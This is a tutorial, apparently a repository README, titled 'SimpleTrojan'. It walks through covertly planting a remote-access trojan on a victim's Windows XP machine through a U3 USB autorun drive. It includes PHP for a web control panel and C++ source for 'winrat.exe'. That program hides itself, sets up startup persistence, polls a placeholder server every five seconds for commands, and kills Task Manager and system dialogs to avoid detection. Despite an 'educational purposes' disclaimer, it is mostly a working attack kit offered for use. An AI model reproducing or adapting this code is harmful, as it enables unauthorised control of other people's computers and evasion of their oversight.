# SimpleTrojan
This is made for educational purposes, I am not responsible for you acts. How to inject a Trojan Virus into a victim's computer !

### Information

Hello everyone, I decided today to stop my C# project to make this one, a simple Trojan Virus. The trojan downloads 3 textfiles each 5 seconds, the textfiles contain a number, and based on that number it executes commands.

Before we start with the C++ code, I have a very easy way to get the trojan on the victim's computer. You just need a U3-enabled USB drive, USB access to the victim's computer, and the Universal Customizer. Delete the U3CUSTOM.ISO and create your own U3CUSTOM.ISO with these files included. (the files will be in the repository)

### Second Step

Then, create a folder "trojan", and we'll later put the trojan files in there. You also need to create a file "Trojan.lnk", it will be copied to the startup folder. Also place all the neccessary DLL's in there for the program to run, for example urlmon.dll and wininet.dll. 

Then create an ISO and run the U3 Updater to put the trojan on your U3 drive. Now it will automatically run go.vbs without any notice once you plug in your U3 drive in any Windows XP computer (It will not work on Vista or 7, they have autorun disabled).

And also, before we start creating our program itself, we need a way to control it. As I said, the trojan downloads 3 files. Let's make these files on our web site/server. Create index.html, assign.html and target.html and don't put anything in there. Then we create a PHP file (edit.php) that is able to edit the html files. Why just PHP and not some normal application? Because this way we can control the trojan from anywhere by just going to yourwebsitehere.com/trojan/edit.php. You can even control computers with your mobile phone if you have mobile internet or Wifi.

[PHP]
<br><HTML><br><HEAD><br><TITLE>Winrat.exe Control Panel</TITLE><br><META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE"><br></HEAD><br><BODY><br><br><?php<br>if (isset($_POST['submit'])) {<br><br>$myFile = "index.html";<br>$fh = fopen($myFile, 'w') or die("can't open file");<br>$stringData = stripslashes($_POST['option']);<br>fwrite($fh, $stringData);<br>fclose($fh);<br><br>$myFile2 = "target.html";<br>$fh = fopen($myFile2, 'w') or die("can't open file");<br>$stringData = stripslashes($_POST['target']);<br>fwrite($fh, $stringData);<br>fclose($fh);<br>}<br><br>if (isset($_POST['clear'])) {<br><br>$myFile = "index.html";<br>$fh = fopen($myFile, 'w') or die("can't open file");<br>$stringData = 0;<br>fwrite($fh, $stringData);<br>fclose($fh);<br>}<br><br>if (isset($_POST['assigncomputer'])) {<br><br>$myFile = "assign.html";<br>$fh = fopen($myFile, 'w') or die("can't open file");<br>$stringData = stripslashes($_POST['assign']);<br>fwrite($fh, $stringData);<br>fclose($fh);<br>}<br>?><br><br><div id="wrapper"><br><form action="" method="post"><br><textarea name="target" style="width: 230px; height: 25px; margin-bottom: 5px; font-size: 20px"><br><?php<br>$myFile = "target.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?></textarea><br><br /><br><textarea name="option" style="width: 230px; height: 60px; margin-bottom: 5px; font-size: 20px"><br><?php<br>$myFile = "index.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?></textarea><br><br /><br><input type="submit" name="submit" value="Edit" style="width: 150px; height: 40px" /><br><input type="submit" name="clear" value="Clear" style="width: 65px; height: 40px" /><br></form><br><br><?php<br>echo 'Current hack activated: <b>';<br><br>$myFile = "index.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?><br></b><br><br /><br \><b>1.</b> Just some<br><br /><b>2.</b> HTML code<br><br /><b>3.</b> to remember<br><br /><b>4.</b> what commands<br><br /><b>5.</b> you can use.<br><br /><br /><br><form action="" method="post"><br><textarea name="assign" style="width: 190px; height: 30px; margin-bottom: 2px; font-size: 20px"><br><?php<br>$myFile = "assign.html";<br>$fh = fopen($myFile, 'r');<br>$theData = fgets($fh);<br>fclose($fh);<br>echo $theData;<br>?></textarea> <br><br /><br><input type="submit" name="assigncomputer" value="Assign" style="width: 190px; height: 25px;" /><br></form><br><br></div><br>


Now we start with creating our winrat.exe, the trojan itself. Here's the source code:

`` #include <windows.h>
#pragma comment(lib, "Winmm.lib")
#include <urlmon.h> 
#pragma comment(lib, "urlmon.lib")
#include <iostream>
#include <fstream>
#include <WinInet.h>
#pragma comment(lib, "WinInet.lib")
#include <ShlObj.h>
using namespace std;
 
int Option, Assign, Target;
DWORD WINAPI LowProfile(LPVOID);
DWORD WINAPI Option1(LPVOID);
DWORD WINAPI Option2(LPVOID);
DWORD WINAPI Option3(LPVOID);
DWORD WINAPI Option4(LPVOID);
DWORD WINAPI Option5(LPVOID);
// Add more lines of Option6, Option7, etc. to create more commands.
HWND TaskMgr, SysError, WMP, Disk1, Disk2, Disk3, Disk4, Autoplay, VBS;
 
int main() {
// Hide Console Window
FreeConsole();
 
CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&LowProfile, 0, 0, NULL);
 
// Checks if assign.txt exists. If it doesn't (only first run), download assign.txt. This gives the computer an ID number. You can change assign.txt in the PHP file BEFORE you plug in the U3 drive.
FILE *istream;
if ( (istream = fopen ( "C:\\Windows\\trojan\\assign.txt", "r" ) ) == NULL ) {
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/assign.html", L"c:\\Windows\\trojan\\assign.txt", NULL, NULL);
} else {
}
 
// Store Assign.txt in a variable
ifstream inAssign;
inAssign.clear();
inAssign.open("c:\\Windows\\trojan\\assign.txt");
inAssign >> Assign;
inAssign.close();
inAssign.clear();
 
// Start the main loop that is downloading the textfile each 5 seconds.
while(1) { ``
 
    // Download Option & Target
    remove("c:\\Windows\\trojan\\option.txt");
    remove("c:\\Windows\\trojan\\target.txt");
    DeleteUrlCacheEntry(L"http://www.yourwebsitehere.com/trojan/");
    DeleteUrlCacheEntry(L"http://www.yourwebsitehere.com/trojan/target.html");
    Sleep(100);
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/", L"c:\\Windows\\trojan\\option.txt", NULL, NULL);
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/target.html", L"c:\\Windows\\trojan\\target.txt", NULL, NULL);
 
    // Read Option
    ifstream inFile;
    inFile.clear();
    inFile.open("c:\\Windows\\trojan\\option.txt");
    inFile >> Option;
    inFile.close();
    inFile.clear();
 
    // Read Target
    ifstream inTarget;
    inTarget.clear();
    inTarget.open("c:\\Windows\\trojan\\target.txt");
    inTarget >> Target;
    inTarget.close();
    inTarget.clear();
 
    // If Target is equal to assign (so you can target a single computer) or if Target is zero (target all computers with your trojan)
    if(Target == Assign || Target == 0) {
        if(Option == 1) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option1, 0, 0, NULL); }
        else if(Option == 2) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option2, 0, 0, NULL); }
        else if(Option == 3) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option3, 0, 0, NULL); }
        else if(Option == 4) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option4, 0, 0, NULL); }
        else if(Option == 5) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option5, 0, 0, NULL); }
        // Add more of these lines for more commands
    }
    Sleep(5000);
    }
``}``
 
`` // Our LowProfile Thread. Hides all errors and things that may popup while inserting your U3 drive.
DWORD WINAPI LowProfile(LPVOID) {
    while(1) {
        // Obvious
        TaskMgr = FindWindow(NULL,L"Windows Task Manager");
        // May popup because of new hardware installation (U3)
        SysError = FindWindow(NULL,L"System Settings Change");
        // Windows Media Player may popup. Rarely happens, but had this once at a school computer.
        WMP = FindWindow(NULL,L"Windows Media Player");
        // The Removable Disk part of the U3 Drive can open automatically.
        Disk1 = FindWindow(NULL,L"(D:) Removable Disk");
        Disk2 = FindWindow(NULL,L"(E:) Removable Disk");
        Disk3 = FindWindow(NULL,L"(F:) Removable Disk");
        Disk4 = FindWindow(NULL,L"(G:) Removable Disk");
        // Autoplay
        Autoplay = FindWindow(NULL,L"Autoplay");
        // Errors caused by our VBScript go.vbs
        VBS = FindWindow(NULL,L"Windows Script Host");
        if( TaskMgr != NULL) {
            SetWindowText( TaskMgr,L"DIE!!!! =O");
            Sleep(500);
            PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( SysError != NULL) {
            PostMessage( SysError, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( WMP != NULL) {
            Sleep(1000);
            PostMessage( WMP, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk1 != NULL) {
            PostMessage( Disk1, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk2 != NULL) {
            PostMessage( Disk2, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk3 != NULL) {
            PostMessage( Disk3, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk4 != NULL) {
            PostMessage( Disk4, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Autoplay != NULL) {
            PostMessage( Autoplay, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( VBS != NULL) {
            PostMessage( VBS, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        Sleep(500);
    }
} ``
 
`` //
// Here we start with our commands. Option1, Option2, Option3, etc.
// Don't forget to also define and create a process for these Options if you want to create more.
// Have Fun =D
//
 
DWORD WINAPI Option1(LPVOID) { // 1
    return 0;
}
 
DWORD WINAPI Option2(LPVOID) { // 2
    return 0;
}
 
DWORD WINAPI Option3(LPVOID) { // 3
    return 0;
}
 
DWORD WINAPI Option4(LPVOID) { // 4
    return 0;
}
 
DWORD WINAPI Option5(LPVOID) { // 5
    return 0;
} ``
